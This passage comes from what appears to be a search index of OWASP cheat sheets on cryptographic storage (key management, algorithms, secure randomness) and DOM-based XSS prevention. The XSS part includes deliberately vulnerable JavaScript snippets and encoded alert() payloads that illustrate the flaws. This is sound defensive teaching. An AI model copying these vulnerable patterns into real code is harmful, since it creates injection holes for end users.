containerised environments. Easy key rotation and replacement. Secure key generation. Simplifying compliance with regulatory standards such as FIPS 140 or PCI DSS. Making it harder for an attacker to export or steal keys. In some cases none of these will be available, such as in a shared hosting environment, meaning that it is not possible to obtain a high degree of protection for any encryption keys. However, the following basic rules can still be followed: Do not hard-code keys into the application source code. Do not check keys into version control systems. Protect the configuration files containing the keys with restrictive permissions. Avoid storing keys in environment variables, as these can be accidentally exposed through functions such as phpinfo() or through the /proc/self/environ file. Separation of Keys and Data \u00b6 Where possible, encryption keys should be stored in a separate location from encrypted data. For example, if the data is stored in a database, the keys should be stored in the filesystem. This means that if an attacker only has access to one of these (for example through directory traversal or SQL injection), they cannot access both the keys and the data. Depending on the architecture of the environment, it may be possible to store the keys and data on separate systems, which would provide a greater degree of isolation. Encrypting Stored Keys \u00b6 Where possible, encryption keys should themselves be stored in an encrypted form. At least two separate keys are required for this: The Data Encryption Key (DEK) is used to encrypt the data. The Key Encryption Key (KEK) is used to encrypt the DEK. For this to be effective, the KEK must be stored separately from the DEK. The encrypted DEK can be stored with the data, but will only be usable if an attacker is able to also obtain the KEK, which is stored on another system. The KEK should also be at least as strong as the DEK. The envelope encryption guidance from Google contains further details on how to manage DEKs and KEKs. In simpler application architectures (such as shared hosting environments) where the KEK and DEK cannot be stored separately, there is limited value to this approach, as an attacker is likely to be able to obtain both of the keys at the same time. However, it can provide an additional barrier to unskilled attackers. A key derivation function (KDF) could be used to generate a KEK from user-supplied input (such a passphrase), which would then be used to encrypt a randomly generated DEK. This allows the KEK to be easily changed (when the user changes their passphrase), without needing to re-encrypt the data (as the DEK remains the same).","title":"Cryptographic Storage"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#cryptographic-storage-cheat-sheet","text":"","title":"Cryptographic Storage Cheat Sheet"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#introduction","text":"This article provides a simple model to follow when implementing solutions to protect data at rest. Passwords should not be stored using reversible encryption - secure password hashing algorithms should be used instead. The Password Storage Cheat Sheet contains further guidance on storing passwords.","title":"Introduction"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#architectural-design","text":"The first step in designing any application is to consider the overall architecture of the system, as this will have a huge impact on the technical implementation. This process should begin with considering the threat model of the application (i.e, who you trying to protect that data against). The use of dedicated secret or key management systems can provide an additional layer of security protection, as well as making the management of secrets significantly easier - however it comes at the cost of additional complexity and administrative overhead - so may not be feasible for all applications. Note that many cloud environments provide these services, so these should be taken advantage of where possible.","title":"Architectural Design"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#where-to-perform-encryption","text":"Encryption can be performed on a number of levels in the application stack, such as: At the application level. At the database level (e.g, SQL Server TDE ) At the filesystem level (e.g, BitLocker or LUKS) At the hardware level (e.g, encrypted RAID cards or SSDs) Which layer(s) are most appropriate will depend on the threat model. For example, hardware level encryption is effective at protecting against the physical theft of the server, but will provide no protection if an attacker is able to compromise the server remotely.","title":"Where to Perform Encryption"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#minimise-the-storage-of-sensitive-information","text":"The best way to protect sensitive information is to not store it in the first place. Although this applies to all kinds of information, it is most often applicable to credit card details, as they are highly desirable for attackers, and PCI DSS has such stringent requirements for how they must be stored. Wherever possible, the storage of sensitive information should be avoided.","title":"Minimise the Storage of Sensitive Information"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms","text":"For symmetric encryption AES with a key that's at least 128 bits (ideally 256 bits ) and a secure mode should be used as the preferred algorithm. For asymmetric encryption, use elliptical curve cryptography (ECC) with a secure curve such as Curve25519 as a preferred algorithm. If ECC is not available and RSA must be used, then ensure that the key is at least 2048 bits . Many other symmetric and asymmetric algorithms are available which have their own pros and cons, and they may be better or worse than AES or Curve25519 in specific use cases. When considering these, a number of factors should be taken into account, including: Key size. Known attacks and weaknesses of the algorithm. Maturity of the algorithm. Approval by third parties such as NIST's algorithmic validation program . Performance (both for encryption and decryption). Quality of the libraries available. Portability of the algorithm (i.e, how widely supported is it). In some cases there may be regulatory requirements that limit the algorithms that can be used, such as FIPS 140-2 or PCI DSS .","title":"Algorithms"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#custom-algorithms","text":"Don't do this.","title":"Custom Algorithms"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#cipher-modes","text":"There are various modes that can be used to allow block ciphers (such as AES) to encrypt arbitrary amounts of data, in the same way that a stream cipher would. These modes have different security and performance characteristics, and a full discussion of them is outside the scope of this cheat sheet. Some of the modes have requirements to generate secure initialisation vectors (IVs) and other attributes, but these should be handled automatically by the library. Where available, authenticated modes should always be used. These provide guarantees of the integrity and authenticity of the data, as well as confidentiality. The most commonly used authenticated modes are GCM and CCM , which should be used as a first preference. If GCM or CCM are not available, then CTR mode or CBC mode should be used. As these do not provide any guarantees about the authenticity of the data, separate authentication should be implemented, such as using the Encrypt-then-MAC technique. Care needs to be taken when using this method with variable length messages If random access to the encrypted data is required then XTS mode should be used. This is typically used for disk encryption, so it unlikely to be used by a web application. ECB should not be used outside of very specific circumstances.","title":"Cipher Modes"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation","text":"Random numbers (or strings) are needed for various security critical functionality, such as generating encryption keys, IVs, session IDs, CSRF tokens or password reset tokens. As such, it is important that these are generated securely, and that it is not possible for an attacker to guess and predict them. It is generally not possible for computers to generate truly random numbers (without special hardware), so most systems and languages provide two different types of randomness. Pseudo-Random Number Generators (PRNG) provide low-quality randomness that are much faster, and can be used for non-security related functionality (such as ordering results on a page, or randomising UI elements). However, they must not be used for anything security critical, as it is often possible for attackers to guess or predict the output. Cryptographically Secure Pseudo-Random Number Generators (CSPRNG) are designed to produce a much higher quality of randomness (more strictly, a greater amount of entropy), making them safe to use for security-sensitive functionality. However, they are slower and more CPU intensive, can end up blocking in some circumstances when large amounts of random data are requested. As such, if large amounts of non-security related randomness are needed, they may not be appropriate. The table below shows the recommended algorithms for each language, as well as insecure functions that should not be used. Language Unsafe Functions Cryptographically Secure Functions C random() , rand() getrandom(2) Java java.util.Random() java.security.SecureRandom PHP rand() , mt_rand() , array_rand() , uniqid() random_bytes() , random_int() in PHP 7 or openssl_random_pseudo_bytes() in PHP 5 .NET/C# Random() RNGCryptoServiceProvider Objective-C arc4random() (Uses RC4 Cipher) SecRandomCopyBytes Python random() secrets() Ruby Random SecureRandom Go rand using math/rand package crypto.rand package Rust rand::prng::XorShiftRng rand::prng::chacha::ChaChaRng and the rest of the Rust library CSPRNGs.","title":"Secure Random Number Generation"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#uuids-and-guids","text":"Universally unique identifiers (UUIDs or GUIDs) are sometimes used as a quick way to generate random strings. Although they can provide a reasonable source of randomness, this will depend on the type or version of the UUID that is created. Specifically, version 1 UUIDs are comprised of a high precision timestamp and the MAC address of the system that generated them, so are not random (although they may be hard to guess, given the timestamp is to the nearest 100ns). Type 4 UUIDs are randomly generated, although whether this is done using a CSPRNG will depend on the implementation. Unless this is known to be secure in the specific language or framework, the randomness of UUIDs should not be relied upon.","title":"UUIDs and GUIDs"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#defence-in-depth","text":"Applications should be designed to still be secure even if cryptographic controls fail. Any information that is stored in an encrypted form should also be protected by additional layers of security. Application should also not rely on the security of encrypted URL parameters, and should enforce strong access control to prevent unauthorised access to information.","title":"Defence in Depth"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-management","text":"","title":"Key Management"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#processes","text":"Formal processes should be implemented (and tested) to cover all aspects of key management, including: Generating and storing new keys. Distributing keys to the required parties. Deploying keys to application servers. Rotating and decommissioning old keys","title":"Processes"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-generation","text":"Keys should be randomly generated using a cryptographically secure function, such as those discussed in the Secure Random Number Generation section. Keys should not be based on common words or phrases, or on \"random\" characters generated by mashing the keyboard. Where multiple keys are used (such as data separate data-encrypting and key-encrypting keys), they should be fully independent from each other.","title":"Key Generation"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-lifetimes-and-rotation","text":"Encryption keys should be changed (or rotated) based on a number of different criteria: If the previous key is known (or suspected) to have been compromised. This could also be caused by a someone who had access to the key leaving the organisation. After a specified period of time has elapsed (known as the cryptoperiod). There are many factors that could affect what an appropriate cryptoperiod is, including the size of the key, the sensitivity of the data, and the threat model of the system. See section 5.3 of NIST SP 800-57 for further guidance. After the key has been used to encrypt a specific amount of data. This would typically be 2^35 bytes (~34GB) for 64-bit keys and 2^68 bytes (~295 exabytes) for 128 bit keys. If there is a significant change to the security provided by the algorithm (such as a new attack being announced). Once one of these criteria have been met, a new key should be generated and used for encrypting any new data. There are two main approaches for how existing data that was encrypted with the old key(s) should be handled: Decrypting it and re-encrypting it with the new key. Marking each item with the ID of the key that was used to encrypt it, and storing multiple keys to allow the old data to be decrypted. The first option should generally be preferred, as it greatly simplifies both the application code and key management processes; however, it may not always be feasible. Note that old keys should generally be stored for a certain period after they have been retired, in case old backups of copies of the data need to be decrypted. It is important that the code and processes required to rotate a key are in place before they are required, so that keys can be quickly rotated in the event of a compromise. Additionally, processes should also be implemented to allow the encryption algorithm or library to be changed, in case a new vulnerability is found in the algorithm or implementation.","title":"Key Lifetimes and Rotation"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-storage","text":"Securely storing cryptographic keys is one of the hardest problems to solve, as the application always needs to have some level of access to the keys in order to decrypt the data. While it may not be possible to fully protect the keys from an attacker who has fully compromised the application, a number of steps can be taken to make it harder for them to obtain the keys. Where available, the secure storage mechanisms provided by the operating system, framework or cloud service provider should be used. These include: A physical Hardware Security Module (HSM). A virtual HSM. Key vaults such as Amazon KMS or Azure Key Vault . Secure storage APIs provided by the ProtectedData class in the .NET framework. There are many advantages to using these types of secure storage over simply putting keys in configuration files. The specifics of these will vary depending on the solution used, but they include: Central management of keys, especially in containerised environments. Easy key rotation and replacement. Secure key generation. Simplifying compliance with regulatory standards such as FIPS 140 or PCI DSS. Making it harder for an attacker to export or steal keys. In some cases none of these will be available, such as in a shared hosting environment, meaning that it is not possible to obtain a high degree of protection for any encryption keys. However, the following basic rules can still be followed: Do not hard-code keys into the application source code. Do not check keys into version control systems. Protect the configuration files containing the keys with restrictive permissions. Avoid storing keys in environment variables, as these can be accidentally exposed through functions such as phpinfo() or through the /proc/self/environ file.","title":"Key Storage"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#separation-of-keys-and-data","text":"Where possible, encryption keys should be stored in a separate location from encrypted data. For example, if the data is stored in a database, the keys should be stored in the filesystem. This means that if an attacker only has access to one of these (for example through directory traversal or SQL injection), they cannot access both the keys and the data. Depending on the architecture of the environment, it may be possible to store the keys and data on separate systems, which would provide a greater degree of isolation.","title":"Separation of Keys and Data"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#encrypting-stored-keys","text":"Where possible, encryption keys should themselves be stored in an encrypted form. At least two separate keys are required for this: The Data Encryption Key (DEK) is used to encrypt the data. The Key Encryption Key (KEK) is used to encrypt the DEK. For this to be effective, the KEK must be stored separately from the DEK. The encrypted DEK can be stored with the data, but will only be usable if an attacker is able to also obtain the KEK, which is stored on another system. The KEK should also be at least as strong as the DEK. The envelope encryption guidance from Google contains further details on how to manage DEKs and KEKs. In simpler application architectures (such as shared hosting environments) where the KEK and DEK cannot be stored separately, there is limited value to this approach, as an attacker is likely to be able to obtain both of the keys at the same time. However, it can provide an additional barrier to unskilled attackers. A key derivation function (KDF) could be used to generate a KEK from user-supplied input (such a passphrase), which would then be used to encrypt a randomly generated DEK. This allows the KEK to be easily changed (when the user changes their passphrase), without needing to re-encrypt the data (as the DEK remains the same).","title":"Encrypting Stored Keys"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html","text":"DOM based XSS Prevention Cheat Sheet \u00b6 Introduction \u00b6 When looking at XSS (Cross-Site Scripting), there are three generally recognized forms of XSS : Reflected or Stored DOM Based XSS . The XSS Prevention Cheatsheet does an excellent job of addressing Reflected and Stored XSS. This cheatsheet addresses DOM (Document Object Model) based XSS and is an extension (and assumes comprehension of) the XSS Prevention Cheatsheet . In order to understand DOM based XSS, one needs to see the fundamental difference between Reflected and Stored XSS when compared to DOM based XSS. The primary difference is where the attack is injected into the application. Reflected and Stored XSS are server side injection issues while DOM based XSS is a client (browser) side injection issue. All of this code originates on the server, which means it is the application owner's responsibility to make it safe from XSS, regardless of the type of XSS flaw it is. Also, XSS attacks always execute in the browser. The difference between Reflected/Stored XSS is where the attack is added or injected into the application. With Reflected/Stored the attack is injected into the application during server-side processing of requests where untrusted input is dynamically added to HTML. For DOM XSS, the attack is injected into the application during runtime in the client directly. When a browser is rendering HTML and any other associated content like CSS, JavaScript, etc. it identifies various rendering contexts for the different kinds of input and follows different rules for each context. A rendering context is associated with the parsing of HTML tags and their attributes. The HTML parser of the rendering context dictates how data is presented and laid out on the page and can be further broken down into the standard contexts of HTML, HTML attribute, URL, and CSS. The JavaScript or VBScript parser of an execution context is associated with the parsing and execution of script code. Each parser has distinct and separate semantics in the way they can possibly execute script code which make creating consistent rules for mitigating vulnerabilities in various contexts difficult. The complication is compounded by the differing meanings and treatment of encoded values within each subcontext (HTML, HTML attribute, URL, and CSS) within the execution context. For the purposes of this article, we refer to the HTML, HTML attribute, URL, and CSS contexts as subcontexts because each of these contexts can be reached and set within a JavaScript execution context. In JavaScript code, the main context is JavaScript but with the right tags and context closing characters, an attacker can try to attack the other 4 contexts using equivalent JavaScript DOM methods. The following is an example vulnerability which occurs in the JavaScript context and HTML subcontext: < script > var x = '<%= taintedVar %>' ; var d = document . createElement ( 'div' ); d . innerHTML = x ; document . body . appendChild ( d ); </ script > Let's look at the individual subcontexts of the execution context in turn. RULE #1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context \u00b6 There are several methods and attributes which can be used to directly render HTML content within JavaScript. These methods constitute the HTML Subcontext within the Execution Context. If these methods are provided with untrusted input, then an XSS vulnerability could result. For example: Example Dangerous HTML Methods \u00b6 Attributes \u00b6 element . innerHTML = \"<HTML> Tags and markup\" ; element . outerHTML = \"<HTML> Tags and markup\" ; Methods \u00b6 document . write ( \"<HTML> Tags and markup\" ); document . writeln ( \"<HTML> Tags and markup\" ); Guideline \u00b6 To make dynamic updates to HTML in the DOM safe, we recommend: HTML encoding, and then JavaScript encoding all untrusted input, as shown in these examples: element . innerHTML = \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ; element . outerHTML = \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ; document . write ( \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ); document . writeln ( \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ); Note: The Encoder.encodeForHTML() and Encoder.encodeForJS() are just notional encoders. Various options for actual encoders are listed later in this document. RULE #2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context \u00b6 The HTML attribute subcontext within the execution context is divergent from the standard encoding rules. This is because the rule to HTML attribute encode in an HTML attribute rendering context is necessary in order to mitigate attacks which try to exit out of an HTML attributes or try to add additional attributes which could lead to XSS. When you are in a DOM execution context you only need to JavaScript encode HTML attributes which do not execute code (attributes other than event handler, CSS, and URL attributes). For example, the general rule is to HTML Attribute encode untrusted data (data from the database, HTTP request, user, back-end system, etc.) placed in an HTML Attribute. This is the appropriate step to take when outputting data in a rendering context, however using HTML Attribute encoding in an execution context will break the application display of data. SAFE but BROKEN example \u00b6 var x = document . createElement ( \"input\" ); x . setAttribute ( \"name\" , \"company_name\" ); // In the following line of code, companyName represents untrusted user input // The Encoder.encodeForHTMLAttr() is unnecessary and causes double-encoding x . setAttribute ( \"value\" , '<%=Encoder.encodeForJS(Encoder.encodeForHTMLAttr(companyName))%>' ); var form1 = document . forms [ 0 ]; form1 . appendChild ( x ); The problem is that if companyName had the value \"Johnson & Johnson\". What would be displayed in the input text field would be \"Johnson & Johnson\". The appropriate encoding to use in the above case would be only JavaScript encoding to disallow an attacker from closing out the single quotes and in-lining code, or escaping to HTML and opening a new script tag. SAFE and FUNCTIONALLY CORRECT example \u00b6 var x = document . createElement ( \"input\" ); x . setAttribute ( \"name\" , \"company_name\" ); x . setAttribute ( \"value\" , '<%=Encoder.encodeForJS(companyName)%>' ); var form1 = document . forms [ 0 ]; form1 . appendChild ( x ); It is important to note that when setting an HTML attribute which does not execute code, the value is set directly within the object attribute of the HTML element so there is no concerns with injecting up. RULE #3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context \u00b6 Putting dynamic data within JavaScript code is especially dangerous because JavaScript encoding has different semantics for JavaScript encoded data when compared to other encodings. In many cases, JavaScript encoding does not stop attacks within an execution context. For example, a JavaScript encoded string will execute even though it is JavaScript encoded. Therefore, the primary recommendation is to avoid including untrusted data in this context . If you must, the following examples describe some approaches that do and do not work. var x = document . createElement ( \"a\" ); x . href = \"#\" ; // In the line of code below, the encoded data on the right (the second argument to setAttribute) // is an example of untrusted data that was properly JavaScript encoded but still executes. x . setAttribute ( \"onclick\" , \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0032\\u0032\\u0029\" ); var y = document . createTextNode ( \"Click To Test\" ); x . appendChild ( y ); document . body . appendChild ( x ); The setAttribute(name_string,value_string) method is dangerous because it implicitly coerces the value_string into the DOM attribute datatype of name_string . In the case above, the attribute name is an JavaScript event handler, so the attribute value is implicitly converted to JavaScript code and evaluated. In the case above, JavaScript encoding does not mitigate against DOM based XSS. Other JavaScript methods which take code as a string types will have a similar problem as outline above ( setTimeout , setInterval , new Function, etc.). This is in stark contrast to JavaScript encoding in the event handler attribute of a HTML tag (HTML parser) where JavaScript encoding mitigates against XSS. <!-- Does NOT work --> < a id = \"bb\" href = \"#\" onclick = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\" > Test Me </ a > An alternative to using Element.setAttribute(...) to set DOM attributes is to set the attribute directly. Directly setting event handler attributes will allow JavaScript encoding to mitigate against DOM based XSS. Please note, it is always dangerous design to put untrusted data directly into a command execution context. < a id = \"bb\" href = \"#\" > Test Me </ a > //The following does NOT work because the event handler is being set to a string. //\"alert(7)\" is JavaScript encoded. document . getElementById ( \"bb\" ). onclick = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0029\" ; //The following does NOT work because the event handler is being set to a string. document . getElementById ( \"bb\" ). onmouseover = \"testIt\" ; //The following does NOT work because of the encoded \"(\" and \")\". //\"alert(77)\" is JavaScript encoded. document . getElementById ( \"bb\" ). onmouseover = \\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0037\\u0029 ; //The following does NOT work because of the encoded \";\". //\"testIt;testIt\" is JavaScript encoded. document . getElementById ( \"bb\" ). onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074\\u003b\\u0074\\u0065\\u0073 \\u0074\\u0049\\u0074 ; //The following DOES WORK because the encoded value is a valid variable name or function reference. //\"testIt\" is JavaScript encoded document . getElementById ( \"bb\" ). onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074 ; function testIt () { alert ( \"I was called.\" ); } There are other places in JavaScript where JavaScript encoding is accepted as valid executable code. for ( var \\u0062 = 0 ; \\u0062 < 10 ; \\u0062 ++ ){ \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074 . \\u0077\\u0072\\u0069\\u0074\\u0065\\u006c\\u006e ( \"\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064\" ); } \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077 . \\u0065\\u0076\\u0061\\u006c \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074 . \\u0077\\u0072\\u0069\\u0074\\u0065 ( 111111111 ); or var s = \"\\u0065\\u0076\\u0061\\u006c\" ; var t = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\" ; window [ s ]( t ); Because JavaScript is based on an international standard (ECMAScript), JavaScript encoding enables the support of international characters in programming constructs and variables in addition to alternate string representations (string escapes). However the opposite is the case with HTML encoding. HTML tag elements are well defined and do not support alternate representations of the same tag. So HTML encoding cannot be used to allow the developer to have alternate representations of the <a> tag for example. HTML Encoding's Disarming Nature \u00b6 In general, HTML encoding serves to castrate HTML tags which are placed in HTML and HTML attribute contexts. Working example (no HTML encoding): < a href = \"...\" > Normally encoded example (Does Not Work \u2013 DNW): &#x3c; a href=... &#x3e; HTML encoded example to highlight a fundamental difference with JavaScript encoded values (DNW): < &#x61; href=...> If HTML encoding followed the same semantics as JavaScript encoding. The line above could have possibly worked to render a link. This difference makes JavaScript encoding a less viable weapon in our fight against XSS. RULE #4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context \u00b6 Normally executing JavaScript from a CSS context required either passing javascript:attackCode() to the CSS url() method or invoking the CSS expression() method passing JavaScript code to be directly executed. From my experience, calling the expression() function from an execution context (JavaScript) has been disabled. In order to mitigate against the CSS url() method, ensure that you are URL encoding the data passed to the CSS url() method. document . body . style . backgroundImage = \"url(<%=Encoder.encodeForJS(Encoder.encodeForURL(companyName))%>)\" ; RULE #5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context \u00b6 The logic which parses URLs in both execution and rendering contexts looks to be the same. Therefore there is little change in the encoding rules for URL attributes in an execution (DOM) context. var x = document . createElement ( \"a\" ); x . setAttribute ( \"href\" , '<%=Encoder.encodeForJS(Encoder.encodeForURL(userRelativePath))%>' ); var y = document . createTextElement ( \"Click Me To Test\" ); x . appendChild ( y ); document . body . appendChild ( x ); If you utilize fully qualified URLs then this will break the links as the colon in the protocol identifier ( http: or javascript: ) will be URL encoded preventing the http and javascript protocols from being invoked. RULE #6 - Populate the DOM using safe JavaScript functions or properties \u00b6 The most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property textContent . Here is an example of safe usage. < script > element . textContent = untrustedData ; //does not execute code </ script > RULE #7 - Fixing DOM Cross-site Scripting Vulnerabilities \u00b6 The best way to fix DOM based cross-site scripting is to use the right output method (sink). For example if you want to use user input to write in a div tag element don't use innerHtml , instead use innerText or textContent . This will solve the problem, and it is the right way to re-mediate DOM based XSS vulnerabilities. It is always a bad idea to use a user-controlled input in dangerous sources such as eval. 99% of the time it is an indication of bad or lazy programming practice, so simply don't do it instead of trying to sanitize the input. Finally, to fix the problem in our initial code, instead of trying to encode the output correctly which is a hassle and can easily go wrong we would simply use element.textContent to write it in a content like this: < b > Current URL: </ b > < span id = \"contentholder\" ></ span > ... < script > document . getElementById ( \"contentholder\" ). textContent = document . baseURI ; </ script > It does the same thing but this time it is not vulnerable to DOM based cross-site scripting vulnerabilities. Guidelines for Developing Secure Applications Utilizing JavaScript \u00b6 DOM based XSS is extremely difficult to mitigate against because of its large attack surface and lack of standardization across browsers. The guidelines below are an attempt to provide guidelines for developers when developing Web based JavaScript applications (Web 2.0) such that they can avoid XSS. GUIDELINE #1 - Untrusted data should only be treated as displayable text \u00b6 Avoid treating untrusted data as code or markup within JavaScript code. GUIDELINE #2 - Always JavaScript encode and delimit untrusted data as quoted strings when entering the application when building templated JavaScript \u00b6 Always JavaScript encode and delimit untrusted data as quoted strings when entering the application as illustrated in the following example. var x = \"<%= Encode.forJavaScript(untrustedData) %>\" ; GUIDELINE #3 - Use document.createElement(\"...\"), element.setAttribute(\"...\",\"value\"), element.appendChild(...) and similar to build dynamic interfaces \u00b6 document.createElement(\"...\") , element.setAttribute(\"...\",\"value\") , element.appendChild(...) and similar are save ways to build dynamic interfaces. Please note, element.setAttribute is only safe for a limited number of attributes. Dangerous attributes include any attribute that is a command execution context, such as onclick or onblur . Examples of safe attributes includes: align , alink , alt , bgcolor , border , cellpadding , cellspacing , class , color , cols , colspan , coords , dir , face , height , hspace , ismap , lang , marginheight , marginwidth , multiple , nohref , noresize , noshade , nowrap , ref , rel , rev , rows , rowspan , scrolling , shape , span , summary , tabindex , title , usemap , valign , value , vlink , vspace , width . GUIDELINE #4 - Avoid sending untrusted data into HTML rendering methods \u00b6 Avoid populating the following methods with untrusted data. element.innerHTML = \"...\"; element.outerHTML = \"...\"; document.write(...); document.writeln(...); GUIDELINE #5 - Avoid the numerous methods which implicitly eval() data passed to it \u00b6 There are numerous methods which implicitly eval() data passed to it that must be avoided. Make sure that any untrusted data passed to these methods is: Delimited with string delimiters Enclosed within a closure or JavaScript encoded to N-levels based on usage Wrapped in a custom function. Ensure to follow step 3 above to make sure that the untrusted data is not sent to dangerous methods within the custom function or handle it by adding an extra layer of encoding. Utilizing an Enclosure (as suggested by Gaz) \u00b6 The example that follows illustrates using closures to avoid double JavaScript encoding. setTimeout (( function ( param ) { return function () { customFunction ( param ); } })( \"<%=Encoder.encodeForJS(untrustedData)%>\" ), y ); The other alternative is using N-levels of encoding. N-Levels of Encoding \u00b6 If your code looked like the following, you would need to only double JavaScript encode input data. setTimeout ( \"customFunction('<%=doubleJavaScriptEncodedData%>', y)\" ); function customFunction ( firstName , lastName ) alert ( \"Hello\" + firstName + \" \" + lastNam ); } The doubleJavaScriptEncodedData has its first layer of JavaScript encoding reversed (upon execution) in the single quotes. Then the implicit eval of setTimeout reverses another layer of JavaScript encoding to pass the correct value to customFunction The reason why you only need to double JavaScript encode is that the customFunction function did not itself pass the input to another method which implicitly or explicitly called eval If firstName was passed to another JavaScript method which implicitly or explicitly called eval() then <%=doubleJavaScriptEncodedData%> above would need to be changed to <%=tripleJavaScriptEncodedData%> . An important implementation note is that if the JavaScript code tries to utilize the double or triple encoded data in string comparisons, the value may be interpreted as different values based on the number of evals() the data has passed through before being passed to the if comparison and the number of times the value was JavaScript encoded. If A is double JavaScript encoded then the following if check will return false. var x = \"doubleJavaScriptEncodedA\" ; //\\u005c\\u0075\\u0030\\u0030\\u0034\\u0031 if ( x == \"A\" ) { alert ( \"x is A\" ); } else if ( x == \"\\u0041\" ) { alert ( \"This is what pops\" ); } This brings up an interesting design point. Ideally, the correct way to apply encoding and avoid the problem stated above is to server-side encode for the output context where data is introduced into the application. Then client-side encode (using a JavaScript encoding library such as ESAPI4JS ) for the individual subcontext (DOM methods) which untrusted data is passed to. ESAPI4JS and jQuery Encoder are two client side encoding libraries developed by Chris Schmidt. Here are some examples of how they are used: //server-side encoding var input = \"<%=Encoder.encodeForJS(untrustedData)%>\" ; //HTML encoding is happening in JavaScript document . writeln ( ESAPI4JS . encodeForHTML ( input )); One option is utilize ECMAScript 5 immutable properties in the JavaScript library. Another option provided by Gaz (Gareth) was to use a specific code construct to limit mutability with anonymous closures. An example follows: function escapeHTML ( str ) { str = str + \"''\" ; var out = \"''\" ; for ( var i = 0 ; i < str . length ; i ++ ) { if ( str [ i ] === '<' ) { out += '&lt;' ; } else if ( str [ i ] === '>' ) { out += '&gt;' ; } else if ( str [ i ] === \"'\" ) { out += '&#39;' ; } else if ( str [ i ] === '\"' ) { out += '&quot;' ; } else { out += str [ i ]; } } return out ; } Chris Schmidt has put together another implementation of a JavaScript encoder here . GUIDELINE #6 - Limit the usage of untrusted data to only right side operations \u00b6 Not only is it good design to limit the usage of untrusted data to right side operations, but also be aware of data which may be passed to the application which look like code (eg. location , eval() ). If you want to change different object attributes based on user input then use a level of indirection. Instead of: window [ userData ] = \"moreUserData\" ; Do the following instead: if ( userData === \"location\" ) { window . location = \"static/path/or/properly/url/encoded/value\" ; } GUIDELINE #7 - When URL encoding in DOM be aware of character set issues \u00b6 When URL encoding in DOM be aware of character set issues as the character set in JavaScript DOM is not clearly defined (Mike Samuel). GUIDELINE #8 - Limit access to properties objects when using object[x] accessors \u00b6 Limit access to properties objects when using object[x] accessors (Mike Samuel). In other words use a level of indirection between untrusted input and specified object properties. Here is an example of the problem when using map types: var myMapType = {}; myMapType [ <%= untrustedData %> ] = \"moreUntrustedData\" ; Although the developer writing the code above was trying to add additional keyed elements to the myMapType object. This could be used by an attacker to subvert internal and external attributes of the myMapType object. GUIDELINE #9 - Run your JavaScript in a ECMAScript 5 canopy or sandbox \u00b6 Run your JavaScript in a ECMAScript 5 canopy or sandbox to make it harder for your JavaScript API to be compromised (Gareth Heyes and John Stevens). GUIDELINE #10 - Don't eval() JSON to convert it to native JavaScript objects \u00b6 Don't eval() JSON to convert it to native JavaScript objects. Instead use JSON.toJSON() and JSON.parse() (Chris Schmidt). Common Problems Associated with Mitigating DOM Based XSS \u00b6 Complex Contexts \u00b6 In many cases the context isn't always straightforward to discern. < a href = \"javascript:myFunction('<%=untrustedData%>', 'test');\" > Click Me </ a > ... < script > Function myFunction ( url , name ) { window . location = url ; } </ script > In the above example, untrusted data started in the rendering URL context ( href attribute of an a tag) then changed to a JavaScript execution context ( javascript: protocol handler) which passed the untrusted data to an execution URL subcontext ( window.location of myFunction ). Because the data was introduced in JavaScript code and passed to a URL subcontext the appropriate server-side encoding would be the following: < a href = \"javascript:myFunction('<%=Encoder.encodeForJS(Encoder.encodeForURL(untrustedData)) %>', 'test');\" > Click Me </ a > ... Or if you were using ECMAScript 5 with an immutable JavaScript client-side encoding libraries you could do the following: <!-- server side URL encoding has been removed. Now only JavaScript encoding on server side. --> < a href = \"javascript:myFunction('<%=Encoder.encodeForJS(untrustedData)%>', 'test');\" > Click Me </ a > ... < script > Function myFunction ( url , name ) { var encodedURL = 